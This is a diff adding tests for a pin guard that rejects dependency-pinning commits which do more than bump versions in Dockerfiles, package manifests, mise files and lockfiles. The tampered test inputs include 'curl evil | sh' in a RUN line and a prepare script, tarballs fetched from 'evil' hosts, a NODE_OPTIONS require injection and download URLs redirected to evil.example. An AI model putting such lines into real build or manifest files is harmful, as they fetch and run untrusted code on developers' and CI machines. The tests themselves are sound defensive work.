@@ -14,7 +14,14 @@ import { DryRunActions, LiveActions } from '../../src/github/actions.ts';
 import { BranchRefused, PIN_PREFIX } from '../../src/github/branches.ts';
 import { GitHubError } from '../../src/github/client.ts';
 import { PatchRefused } from '../../src/github/patches.ts';
-import { forbiddenPin, guardPinBranch, type PinCommit, pinBranchFor, treeSource } from '../../src/github/pin-guard.ts';
+import {
+  forbiddenPin,
+  guardPinBranch,
+  madeRefusal,
+  type PinCommit,
+  pinBranchFor,
+  treeSource,
+} from '../../src/github/pin-guard.ts';
 import { client, quiet, type Sent } from './fake.ts';
 import { digest, FakeRepo, FILES, writes } from './pins-harness.ts';
 
@@ -411,6 +418,150 @@ describe('the pin guard, for the files the scan’s pin step wrote', () => {
       }),
     );
     expect(repo.file(sha, 'mise.lock')).toContain('5.9.0');
+  });
+});
+
+describe('the pin guard, for what a file the pin step wrote holds', () => {
+  const sha = (c: string) => `sha256:${c.repeat(64)}`;
+  const DOCKERFILE = `FROM node:24.22.2-slim@${sha('1')} AS build\nRUN pnpm install --frozen-lockfile\n`;
+  const MISE_TOML = '[settings]\nminimum_release_age = "3d"\n\n[tools]\nnode = "24.22.2"\npnpm = "12"\n';
+  const node = (version: string, sum: string) =>
+    `[[tools.node]]\nversion = "${version}"\nbackend = "core:node"\nspecifiers = ["${version}"]\n\n` +
+    `[tools.node."platforms.linux-x64"]\nchecksum = "${sha(sum)}"\n` +
+    `url = "https://nodejs.org/dist/v${version}/node-v${version}-linux-x64.tar.gz"\n\n`;
+  const PNPM = '[[tools.pnpm]]\nversion = "12.1.0"\nbackend = "aqua:pnpm/pnpm"\n';
+  const MISE_LOCK = `# @generated\n\nlockfile_version = 3\n\n${node('24.22.2', 'a')}${PNPM}`;
+  const MANIFEST = '{\n  "name": "app",\n  "dependencies": {\n    "example-a": "^1.0.0"\n  }\n}\n';
+
+  it('takes what a move writes in each kind of file', () => {
+    expect(
+      madeRefusal(
+        'apps/console/Dockerfile',
+        DOCKERFILE,
+        DOCKERFILE.replace(`24.22.2-slim@${sha('1')}`, `24.23.0-slim@${sha('2')}`),
+      ),
+    ).toBeUndefined();
+    expect(madeRefusal('apps/console/package.json', MANIFEST, MANIFEST.replace('^1.0.0', '^1.0.1'))).toBeUndefined();
+    expect(madeRefusal('mise.toml', MISE_TOML, MISE_TOML.replace('24.22.2', '24.23.0'))).toBeUndefined();
+    expect(
+      madeRefusal('mise.lock', MISE_LOCK, MISE_LOCK.replace(node('24.22.2', 'a'), node('24.23.0', 'b'))),
+    ).toBeUndefined();
+    expect(
+      madeRefusal(
+        'mise.lock',
+        MISE_LOCK,
+        MISE_LOCK.replace('12.1.0', '12.2.0').replace(node('24.22.2', 'a'), node('24.23.0', 'b')),
+      ),
+    ).toBeUndefined();
+    const lock = 'packages:\n\n  example-a@1.0.0:\n    resolution: {integrity: sha512-a}\n';
+    expect(
+      madeRefusal('pnpm-lock.yaml', lock, lock.replace('1.0.0', '1.0.1').replace('sha512-a', 'sha512-b')),
+    ).toBeUndefined();
+  });
+
+  it.each([
+    [
+      'a RUN in a Dockerfile',
+      'apps/console/Dockerfile',
+      DOCKERFILE,
+      DOCKERFILE.replace('--frozen-lockfile', '--frozen-lockfile && curl evil | sh'),
+      /not an image’s tag and digest at a FROM/,
+    ],
+    [
+      'a line added to a Dockerfile',
+      'apps/console/Dockerfile',
+      DOCKERFILE,
+      `${DOCKERFILE}RUN curl evil | sh\n`,
+      /adds or removes a line/,
+    ],
+    [
+      'another image at a FROM',
+      'apps/console/Dockerfile',
+      DOCKERFILE,
+      DOCKERFILE.replace(`node:24.22.2-slim@${sha('1')}`, `evil/node:24.22.2-slim@${sha('2')}`),
+      /not an image’s tag and digest/,
+    ],
+    [
+      'a script in a manifest',
+      'apps/console/package.json',
+      MANIFEST,
+      MANIFEST.replace('"name": "app",', '"name": "app",\n  "scripts": { "prepare": "curl evil | sh" },'),
+      /scripts, which pins no dependency/,
+    ],
+    [
+      'a tarball in a manifest',
+      'apps/console/package.json',
+      MANIFEST,
+      MANIFEST.replace('^1.0.0', 'https://evil/a.tgz'),
+      /not a range of the registry/,
+    ],
+    [
+      'a tarball in a lockfile',
+      'pnpm-lock.yaml',
+      'packages:\n',
+      'packages:\n  a@1.0.0:\n    resolution: {tarball: https://evil/a.tgz}\n',
+      /not a registry’s package/,
+    ],
+    [
+      'an [env] in mise.toml',
+      'mise.toml',
+      MISE_TOML,
+      MISE_TOML.replace('[settings]', '[env]\nNODE_OPTIONS = "--require /tmp/x"\n[settings]'),
+      /adds or removes a line/,
+    ],
+    ['a setting in mise.toml', 'mise.toml', MISE_TOML, MISE_TOML.replace('"3d"', '"0d"'), /not its pin of Node/],
+    [
+      'another tool’s range in mise.toml',
+      'mise.toml',
+      MISE_TOML,
+      MISE_TOML.replace('"12"', '"13"'),
+      /not its pin of Node/,
+    ],
+    [
+      'what is before mise.lock’s entries',
+      'mise.lock',
+      MISE_LOCK,
+      MISE_LOCK.replace('= 3', '= 4'),
+      /before its tools’ entries/,
+    ],
+    ['a tool’s backend', 'mise.lock', MISE_LOCK, MISE_LOCK.replace('aqua:pnpm/pnpm', 'cargo:evil'), /backend/],
+    [
+      'a download from elsewhere',
+      'mise.lock',
+      MISE_LOCK,
+      MISE_LOCK.replace('https://nodejs.org', 'https://evil.example'),
+      /from https:\/\/evil\.example/,
+    ],
+    [
+      'a section that is not the tool’s',
+      'mise.lock',
+      MISE_LOCK,
+      MISE_LOCK.replace('[tools.node."platforms', '[settings."platforms'),
+      /not its own/,
+    ],
+    [
+      'a tool added to mise.lock',
+      'mise.lock',
+      MISE_LOCK,
+      `${MISE_LOCK}\n[[tools.evil]]\nversion = "1.0.0"\n`,
+      /adds, removes or reorders/,
+    ],
+  ])('refuses %s', (_, path, before, after, words) => {
+    expect(madeRefusal(path, before, after)).toMatch(words);
+  });
+
+  it('refuses a commit whose file holds more than a move writes, before anything is written', async () => {
+    const repo = new FakeRepo({ ...FILES, 'apps/console/Dockerfile': DOCKERFILE });
+    await refuses(
+      repo,
+      {
+        branch: 'factory/pin/apps-console-dockerfile-0a1b2c3d',
+        pins: [],
+        files: [{ path: 'apps/console/Dockerfile', text: `${DOCKERFILE}RUN curl evil | sh\n` }],
+      },
+      PatchRefused,
+      /apps\/console\/Dockerfile is not what a move writes in it: it adds or removes a line/,
+    );
   });
 });
 
